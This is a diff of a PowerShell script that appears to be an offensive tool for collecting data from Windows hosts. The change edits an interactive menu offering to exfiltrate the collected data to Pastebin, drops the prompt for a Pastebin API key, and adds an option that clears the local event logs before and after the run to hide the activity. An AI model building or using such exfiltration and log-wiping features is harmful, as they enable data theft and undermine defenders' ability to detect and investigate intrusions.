@@ -214,7 +214,7 @@ else {
     }
 }
 
-$exFiltrate = Read-Host 'Do you want exfiltrate the data (pastebin) ?
+$exFiltrate = Read-Host 'Do you want to exfiltrate the data (pastebin) ?
 1) Yes
 2) No
 0) Exit
@@ -230,12 +230,26 @@ switch ($exFiltrate){
     "0" {Stop-Script}    
     default {Write-Output "The option could not be determined... Exfiltration will be not used";$exFiltrate = "0"}
 }
-if($exFiltrate -eq 1) {
-    $devKey = Read-Host 'What is your dev_key API (pastebin) ?
 
-    Enter your dev_key and press API <ENTER>'
+$clearEventLog = Read-Host 'Do you want to clear event log on this local computer ?
+1) Yes
+2) No
+0) Exit
 
-    $dev_key = $devKey
+Enter menu number and press <ENTER>'
+switch ($clearEventLog){
+    "1" {$clearEventLog = 1}
+    "2" {$clearEventLog = 0}
+    "Yes" {$clearEventLog = 1}
+    "No" {$clearEventLog = 0}
+    "Y" {$clearEventLog = 1}
+    "N" {$clearEventLog = 0}
+    "0" {Stop-Script}    
+    default {Write-Output "The option could not be determined... Cleaning of Event Logs will be not used";$clearEventLog = "0"}
+}
+
+if($clearEventLog -eq 1) {
+     Stop-Activities $scriptPath
 }
 
 if($mode -eq "2r2" -or $mode -eq "232") {
@@ -318,6 +332,10 @@ Remove-Item -Recurse -Force c:\symbols
 Write-Progress -Activity "Write informations in the log file" -status "Running..." -id 1
 End-Log -streamWriter $global:streamWriter
 notepad $logPathName
+
+if($clearEventLog -eq 1) {
+     Clear-Activities $scriptPath
+}
 
 if($exFiltrate -eq 1 -and ![string]::IsNullOrEmpty($dev_key)) {    
     Write-Progress -Activity "Exfiltrate" -status "Running..." -id 1 
